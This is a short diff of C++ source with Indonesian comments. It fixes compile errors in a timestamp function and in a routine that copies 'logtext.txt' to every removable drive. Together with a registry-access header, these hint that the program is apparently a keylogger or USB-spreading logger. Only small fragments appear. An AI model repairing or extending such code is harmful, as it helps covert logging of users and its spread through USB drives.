@@ -7,6 +7,9 @@
 #include <cstdio>
 #include <iostream>
 
+// ini aslinya gak ada
+#include <time.h>;
+
 #include "regacces.h"
 
 using namespace std;
@@ -318,7 +321,10 @@ char* DateTime_Now(void)
 
     itoa((*tm).tm_hour, szConv, 10);
     strncat(szBuf, szConv, sizeof(szBuf)-1);
-    strncat(szBuf, ":", sizeof(szB)-1);
+    
+    // ini aslinya
+    //strncat(szBuf, ":", sizeof(szB)-1);
+    strncat(szBuf, ":", sizeof(szBuf)-1);
 
     itoa((*tm).tm_min, szConv, 10);
     strncat(szBuf, szConv, sizeof(szBuf)-1);
@@ -352,7 +358,9 @@ void CopyToUFD(void)
     {
         if(GetDriveType(drv[i]) == DRIVE_REMOVABLE)
         {
-            strncpy(szDest, drv[i], strln(drv[i]));
+        	// ini aslinya
+            //strncpy(szDest, drv[i], strln(drv[i]));
+            strncpy(szDest, drv[i], strlen(drv[i]));
             strncat(szDest, "\\", MAX_PATH-1);
             strncat(szDest, "logtext.txt", MAX_PATH-1);
 
